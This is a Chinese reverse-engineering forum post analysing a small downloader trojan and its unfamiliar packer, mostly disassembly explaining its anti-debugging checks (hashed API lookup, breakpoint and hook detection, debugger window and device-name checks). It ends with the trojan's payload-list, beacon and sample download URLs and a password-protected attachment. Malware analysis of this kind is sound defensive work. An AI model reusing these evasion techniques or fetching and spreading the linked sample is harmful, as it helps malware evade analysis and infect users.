

# 陌生壳木马的分析

> 原文：[`www.pediy.com/kssd/pediy12/127400.html`](https://www.pediy.com/kssd/pediy12/127400.html)

这个木马是一个恶意网址溢出后下载的。不大才 20 多 k，也没太在意。运行后会下载其他木马，为了得到其它木马和地址才看了看。用 od 加载后运行居然  
有报调试器在运行然后就退出。把 StrongOD 用上照样还是报忧调试器运行。这么小的马，这么强？所以来了兴趣分析了一下。木马本身没什么特点，很普  
通，但这个壳又点意思。  
首先 4 个节都为.kux，没有见过，入口点也很陌生，不能断定是什么壳。  
用 od 加载，在入口点断下。  
开始的代码就是解密，略过。直到运行到解密后的地址，发生异常。  
00409AE1    64:FF35 0000000>push    dword ptr fs:\[0\]  
00409AE8    89A5 C04E0000   mov     dword ptr \[ebp+4EC0\], esp  
00409AEE    64:8925 0000000>mov     dword ptr fs:\[0\], esp  
00409AF5    33C0            xor     eax, eax  
00409AF7    8700            xchg    dword ptr \[eax\], eax  
00409AF9    64:8F05 0000000>pop     dword ptr fs:\[0\]  
00409B00    83C4 04         add     esp, 4  
00409B03    61              popad  
00409B04    C3              retn  
此时 SEH 链指向 00409B05，处理后到达  
0040703F    8DB5 DB5A0000   lea     esi, dword ptr \[ebp+5ADB\]  
00407045    8D9D 7E030000   lea     ebx, dword ptr \[ebp+37E\]  
0040704B    33FF            xor     edi, edi  
0040704D    E8 69440000     call    0040B4BB      ；反调试，感兴趣的地方，跟进去  
00407052    6A 40           push    40  
00407054    68 00100000     push    1000  
00407059    68 00200C00     push    0C2000  
0040705E    6A 00           push    0  
00407060    FF95 290B0000   call    dword ptr \[ebp+B29\]  
00407066    8985 A44E0000   mov     dword ptr \[ebp+4EA4\], eax  
0040706C    EB 03           jmp     short 00407071  
上面函数 0040B4BB:  
...                          ;来到这里  
0040B4F8    FF33            push    dword ptr \[ebx\]   ；哈希值  
0040B4FA    FFB5 D04E0000   push    dword ptr \[ebp+4ED0\] ；dll 的地址  
0040B500    E8 28050000     call    0040BA2D  ；根据函数名的哈希值获得函数地址  
0040B505    0BC0            or      eax, eax  
0040B507    74 14           je      short 0040B51D  
0040B509    FF30            push    dword ptr \[eax\]   ；函数入口  
0040B50B    59              pop     ecx  
0040B50C    80F9 CC         cmp     cl, 0CC           ；判断是否有 cc 断点  
0040B50F    75 0A           jnz     short 0040B51B  
0040B511    C785 71510000 0>mov     dword ptr \[ebp+5171\], 1  ；是否有调试标志，如果有调试赋值 1  
0040B51B    8903            mov     dword ptr \[ebx\], eax     ；保存得到的地址  
0040B51D    83C3 04         add     ebx, 4                   ；获取下一个要得到的函数哈希  
0040B520    4E              dec     esi  
0040B521    83FE 00         cmp     esi, 0  
0040B524  ^ 77 D2           ja      short 0040B4F8  
0040B526    83BD 71510000 0>cmp     dword ptr \[ebp+5171\], 1  ；是否有调试标志，如果有调试赋值 1  
0040B52D    0F84 57010000   je      0040B68A  
得到下列函数地址  
IsDebuggerPresent  
CheckRemoteDebuggerPresent  
GetVersionExA  
CreateFileA  
GetCurrentProcessId  
\----继续:  
0040B526    83BD 71510000 0>cmp     dword ptr \[ebp+5171\], 1 ;判断是否被调试，如果调试就跳走  
0040B52D    0F84 57010000   je      0040B68A  
0040B533    C785 7D510000 9>mov     dword ptr \[ebp+517D\], 94  
0040B53D    8D85 7D510000   lea     eax, dword ptr \[ebp+517D\]  
0040B543    50              push    eax  
0040B544    FF95 47510000   call    dword ptr \[ebp+5147\]      ；kernel32.GetVersionExA 获得系统版本  
0040B54A    83BD 8D510000 0>cmp     dword ptr \[ebp+518D\], 1  
0040B551    74 19           je      short 0040B56C  
0040B553    83BD 3F510000 0>cmp     dword ptr \[ebp+513F\], 0  
0040B55A    74 10           je      short 0040B56C  
0040B55C    FF95 3F510000   call    dword ptr \[ebp+513F\]      ；kernel32.IsDebuggerPresent  
0040B562    0BC0            or      eax, eax  
0040B564    74 06           je      short 0040B56C  
0040B566    8985 71510000   mov     dword ptr \[ebp+5171\], eax  ；把 IsDebuggerPresent 结果放到标志位\[ebp+5171\]  
0040B56C    83BD 8D510000 0>cmp     dword ptr \[ebp+518D\], 2      
0040B573    75 38           jnz     short 0040B5AD  
0040B575    81BD 43510000 7>cmp     dword ptr \[ebp+5143\], 6D3A8272 ；判断函数是哈希值还是函数地址  
0040B57F    74 27           je      short 0040B5A8  
0040B581    8D85 75510000   lea     eax, dword ptr \[ebp+5175\]   ；另一个调试标志位  
0040B587    50              push    eax  
0040B588    6A FF           push    -1  
0040B58A    FF95 43510000   call    dword ptr \[ebp+5143\]     ; kernel32.CheckRemoteDebuggerPresent，  
0040B590    8B85 43510000   mov     eax, dword ptr \[ebp+5143\]  
0040B596    8138 8B442408   cmp     dword ptr \[eax\], 824448B  ；判断 CheckRemoteDebuggerPresent 函数入口是不是 824448Bh  
0040B59C    75 0A           jnz     short 0040B5A8  
0040B59E    C785 75510000 0>mov     dword ptr \[ebp+5175\], 1 ;如果是设置调试标志位  
0040B5A8    E8 62FDFFFF     call    0040B30F             ；再次获得函数  
获得的函数并检查是否被 hook：  
OpenProcess：  
cmp   byte ptr \[eax+6\], 0EA  ；函数入口偏移 6h，eah  
OutputDebugStringA：  
cmp     dword ptr \[eax\], 1E8  
cmp     dword ptr \[eax+5\], C0855890   
Process32NextW：  
cmp     word ptr \[eax\], 0C033  
Module32NextW：  
cmp     word ptr \[eax\], 0C033  
ntdll.ZwQueryInformationProcess：  
ntdll.ZwQueryObject：  
ntdll.ZwQuerySystemInformation：  
cmp     byte ptr \[eax\], 0FF  
cmp     byte ptr \[eax\], 0E9  
ntdll.ZwSetInformationThread  
cmp     byte ptr \[eax\], 0E9  
如果有被 hook 就会设置\[ebp+5171\]  
\----继续:  
0040B5AD    FFB5 53510000   push    dword ptr \[ebp+5153\]  
0040B5B3    FFB5 D44E0000   push    dword ptr \[ebp+4ED4\]  
0040B5B9    E8 6F040000     call    0040BA2D  ; 获得 user32.FindWindowA  
0040B5BE    E8 C1FEFFFF     call    0040B484  ；查找监视工具  
0040B5C3    8D9D 57510000   lea     ebx, dword ptr \[ebp+5157\]  
0040B5C9    6A 00           push    0  
0040B5CB    53              push    ebx   ；"OLLYDBG"  
0040B5CC    FFD0            call    eax   ；user32.FindWindowA  
0040B5CE    0BC0            or      eax, eax  
0040B5D0    74 0A           je      short 0040B5DC  
0040B5D2    C785 71510000 0>mov     dword ptr \[ebp+5171\], 1 ;如果找到设置调试标志位  
查找监视工具函数用 FindWindowA 函数查找下列窗口，如果找到设置监视标志位\[ebp+5179\]  
"FileMonClass"  
"18467-41"  
\----继续:  
0040B5DC    33DB            xor     ebx, ebx  
0040B5DE    68 50D4AC0C     push    0CACD450  
0040B5E3    FFB5 D44E0000   push    dword ptr \[ebp+4ED4\]  
0040B5E9    E8 3F040000     call    0040BA2D  ; 获得 user32.GetForegroundWindow  
0040B5EE    FFD0            call    eax       ; user32.GetForegroundWindow  
0040B5F0    8BF0            mov     esi, eax  
0040B5F2    68 0A10299C     push    9C29100A  
0040B5F7    FFB5 D44E0000   push    dword ptr \[ebp+4ED4\]  
0040B5FD    E8 2B040000     call    0040BA2D  ;获得 user32.GetWindowTextA  
0040B602    68 00100000     push    1000  
0040B607    FFB5 69510000   push    dword ptr \[ebp+5169\]  
0040B60D    56              push    esi  
0040B60E    FFD0            call    eax        ; user32.GetWindowTextA  
0040B610    8B85 69510000   mov     eax, dword ptr \[ebp+5169\]  ；标题条文本地址  
0040B616    33DB            xor     ebx, ebx  
0040B618    33D2            xor     edx, edx  
0040B61A    B9 1A000000     mov     ecx, 1A   ；长度  
0040B61F    50              push    eax  
0040B620    8A10            mov     dl, byte ptr \[eax\]  
0040B622    0AD2            or      dl, dl  
0040B624    75 03           jnz     short 0040B629  
0040B626    58              pop     eax  
0040B627    EB 1F           jmp     short 0040B648  ；没有超过 1ah 长度跳出循环  
0040B629    C1C3 07         rol     ebx, 7  
0040B62C    32DA            xor     bl, dl  
0040B62E    40              inc     eax  
0040B62F    49              dec     ecx  
0040B630  ^ 75 EE           jnz     short 0040B620  
0040B632    58              pop     eax  
0040B633    40              inc     eax  
0040B634    81FB 6DA173D0   cmp     ebx, D073A16D   ；比较得到的哈希值是否为 D073A16D  
0040B63A    74 02           je      short 0040B63E  
0040B63C  ^ EB D8           jmp     short 0040B616  
0040B63E    C785 71510000 0>mov     dword ptr \[ebp+5171\], 1   ；设置\[ebp+5171\]  
0040B648    E8 5B000000     call    0040B6A8   ；hook DbgUiRemoteBreakin  
标题条文本如果大于 1ah 个字节，则循环从第一个字节，但不超过 1ah 个字节做哈希，查询结果是否为 D073A16D，如果是，设置 dword ptr \[ebp+5171\]位  
D073A16D 为  
43 50 55 20 2D 20 6D 61 69 6E 20 74 68 72 65 61    
64 2C 20 6D 6F 64 75 6C 65 20  
CPU - main thread, module   
哈希值  
hook DbgUiRemoteBreakin 为 kernel32.ExitProcess  
\----继续:  
0040B658    6A 00           push    0  
0040B65A    68 80000000     push    80  
0040B65F    6A 03           push    3  
0040B661    6A 00           push    0  
0040B663    6A 01           push    1  
0040B665    68 00000080     push    80000000  
0040B66A    57              push    edi  
0040B66B    FF95 4B510000   call    dword ptr \[ebp+514B\]     ; kernel32.CreateFileA  
0040B671    83F8 FF         cmp     eax, -1  
0040B674    74 0A           je      short 0040B680  
0040B676    C785 71510000 0>mov     dword ptr \[ebp+5171\], 1   ；设置\[ebp+5171\]  
0040B680    47              inc     edi  
0040B681    803F 00         cmp     byte ptr \[edi\], 0  
0040B684  ^ 75 FA           jnz     short 0040B680  
0040B686    47              inc     edi  
0040B687    4E              dec     esi  
0040B688  ^ 75 CE           jnz     short 0040B658  
0040B68A    FF85 6D510000   inc     dword ptr \[ebp+516D\]  
0040B690    68 00400000     push    4000  
0040B695    68 00100000     push    1000  
0040B69A    FFB5 69510000   push    dword ptr \[ebp+5169\]  
0040B6A0    FF95 310B0000   call    dword ptr \[ebp+B31\]   ；释放前面用到的空间  
0040B6A6    61              popad  
0040B6A7    C3              retn  
打开下列文件如果找到设置\[ebp+5171\]  
\\\\.\\SICE  
\\\\.\\SIWVID  
\\\\.\\NTICE  
\\\\.\\REGSYS  
\\\\.\\REGVXG  
\\\\.\\FILEVXG  
\\\\.\\FILEM  
\\\\.\\TRW  
\\\\.\\ICEEXT  
到这里这里反调试函数结束。  
来到后面:  
004070ED    8B06            mov     eax, dword ptr \[esi\]  
004070EF    8985 CC4E0000   mov     dword ptr \[ebp+4ECC\], eax  
004070F5    83C6 04         add     esi, 4  
004070F8    E8 49470000     call    0040B846   ;解密函数，解密 0040CB32 为起始地址，0C8 大小  
004070FD    83C6 04         add     esi, 4  
00407100    53              push    ebx  
00407101    6A 40           push    40  
00407103    68 00100000     push    1000  
00407108    68 C0000000     push    0C0  
0040710D    6A 00           push    0  
0040710F    FF95 290B0000   call    dword ptr \[ebp+B29\]  
00407115    8985 D75A0000   mov     dword ptr \[ebp+5AD7\], eax  
0040711B    5B              pop     ebx  
0040711C    60              pushad  
0040711D    FFB5 A44E0000   push    dword ptr \[ebp+4EA4\]  
00407123    56              push    esi  
00407124    FFB5 D75A0000   push    dword ptr \[ebp+5AD7\]  
0040712A    FFD3            call    ebx  ;  
0040712C    61              popad  
0040712D    E8 DF450000     call    0040B711  ；根据反调试标准弹出 messagebox  
这里解密函数 0040B846，是以 00406FF5 到 00407378 数据的哈希值作为 key，解密 0040CB32 为起始地址，0C8 大小所以如果这段数据下软件断点会导致  
后面数据解密错误。  
函数 0040B711：  
0040B711    60              pushad  
0040B712    83BD 71510000 0>cmp     dword ptr \[ebp+5171\], 1  ；调试标志位 1  
0040B719    74 09           je      short 0040B724  
0040B71B    83BD 75510000 0>cmp     dword ptr \[ebp+5175\], 1  ；调试标志位 2  
0040B722    75 4A           jnz     short 0040B76E  
0040B724    83BD 0E540000 0>cmp     dword ptr \[ebp+540E\], 0  
0040B72B    75 3B           jnz     short 0040B768  
0040B72D    81BD F04E0000 0>cmp     dword ptr \[ebp+4EF0\], ABBC680D  
0040B737    75 17           jnz     short 0040B750  
0040B739    FFB5 F04E0000   push    dword ptr \[ebp+4EF0\]  
0040B73F    FFB5 D44E0000   push    dword ptr \[ebp+4ED4\]  
0040B745    E8 E3020000     call    0040BA2D           ；获得 messagebox  
0040B74A    8985 F04E0000   mov     dword ptr \[ebp+4EF0\], eax  
0040B750    6A 30           push    30  
0040B752    8D85 0B4F0000   lea     eax, dword ptr \[ebp+4F0B\]  
0040B758    50              push    eax  
0040B759    8D85 84520000   lea     eax, dword ptr \[ebp+5284\]  
0040B75F    50              push    eax  
0040B760    6A 00           push    0  
0040B762    FF95 F04E0000   call    dword ptr \[ebp+4EF0\]   ；messagebox  
0040B768    61              popad  
0040B769    58              pop     eax  
0040B76A    61              popad  
0040B76B    C3              retn  
0040B76C    EB 51           jmp     short 0040B7BF  
0040B76E    83BD 79510000 0>cmp     dword ptr \[ebp+5179\], 1     ；监视标志位  
0040B775    75 48           jnz     short 0040B7BF  
0040B777    83BD 0E540000 0>cmp     dword ptr \[ebp+540E\], 0  
0040B77E    75 3B           jnz     short 0040B7BB  
0040B780    81BD F04E0000 0>cmp     dword ptr \[ebp+4EF0\], ABBC680D  
0040B78A    75 17           jnz     short 0040B7A3  
0040B78C    FFB5 F04E0000   push    dword ptr \[ebp+4EF0\]  
0040B792    FFB5 D44E0000   push    dword ptr \[ebp+4ED4\]  
0040B798    E8 90020000     call    0040BA2D       ；获得 messagebox  
0040B79D    8985 F04E0000   mov     dword ptr \[ebp+4EF0\], eax  
0040B7A3    6A 30           push    30  
0040B7A5    8D85 0B4F0000   lea     eax, dword ptr \[ebp+4F0B\]  
0040B7AB    50              push    eax  
0040B7AC    8D85 05530000   lea     eax, dword ptr \[ebp+5305\]  
0040B7B2    50              push    eax  
0040B7B3    6A 00           push    0  
0040B7B5    FF95 F04E0000   call    dword ptr \[ebp+4EF0\]   ；messagebox  
0040B7BB    61              popad  
0040B7BC    58              pop     eax  
0040B7BD    61              popad  
0040B7BE    C3              retn  
0040B7BF    61              popad  
0040B7C0    C3              retn  
后面就是对于木马的代码解密，没什么有意思的地方，  
到 004072C6  - E9 95A6FFFF     jmp     00401960 跳向 ep  
下面进入木马代码，这个木马内容很简单，把自己复制到  
%temp%\\SOFTWARE.LOG  
%WINDOWS%\\Tasks\\conime.exe  
然后从 http://down.playboyshop.info/1.txt 获得下载列表下载其他木马  
获取主机 mac 地址和操作系统，并填上自己的版本（这个木马应该 1.0 的版本）发送到下面地址：  
http://hosting.cafe24s.info/me/tj/count/count.asp?mac=\[macaddress\]&ver=1.0&os=\[OS\]   
不过木马是两部分，一部分是申请的空间，一部分是 401000 段，两段代码来回执行完成上面的操作。  
总结：  
过掉 StrongOD 是 CheckRemoteDebuggerPresent 函数。这个不知道是不是我不会用的原因，我只是默认的选择。  
获取标题条文本，这个虽然使用 StrongOD 和不使用有区别  
没有使用：0llyICE - \[CPU - main thread, module 1224\]  
使用：0llyICE - \[\*C.P.U\* - main thread, module 1224\]  
但 StrongOD 也是固定的，每次都是这样，这里再添加对应的哈希值也能检测出  
这个壳不知道那位仁兄知道，把代码分成两段交替执行，不知道是不是因为加壳的缘故，还是木马自己就是这样写的？如果真是这个壳的缘故那这个  
壳就太强大了。  
木马下载地址：  
down.playboyshop.info/1224.exe

上传的附件
| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) || 1224.rar\[解压密码：muma\]  
 |